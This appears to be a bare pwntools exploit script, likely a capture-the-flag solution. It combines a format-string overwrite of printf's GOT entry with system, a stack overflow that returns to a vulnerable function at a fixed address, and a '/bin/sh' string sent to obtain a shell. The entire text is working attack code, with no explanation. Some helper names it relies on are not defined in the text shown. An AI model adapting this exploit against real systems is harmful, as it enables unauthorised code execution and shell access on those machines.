from pwn import *
system_plt=elf.plt.system
printf_got=elf.got.printf
payload=fmtstr_payload(6,{printf_got:system_plt})
sa(b"name:",payload)
vuln_addr=0x40076F
payload=flat({0x58:vuln_addr})
sa(b'keep on !',payload)
sa(b"name:",b'/bin/sh\x00')
ia()
